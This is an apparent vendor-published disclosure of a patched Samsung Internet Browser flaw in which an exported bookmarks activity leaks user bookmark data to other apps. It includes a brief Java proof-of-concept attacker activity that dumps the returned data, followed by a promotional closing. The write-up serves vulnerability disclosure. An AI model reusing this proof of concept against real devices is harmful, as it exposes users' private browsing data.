# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Internet Browser</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.android.app.sbrowser</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.15</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.06.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$300</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

The app returned sensitive data that the user interacted with to the attacking app. Examples are bookmarks that the user clicked on.

**Proof of Concept**

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent i = new Intent("com.sec.android.app.sbrowser.bookmarksDb.ui.ShowBookmarksActivity");
    startActivityForResult(i, 0);
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    DumpUtils.dump(data, getClassLoader());
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.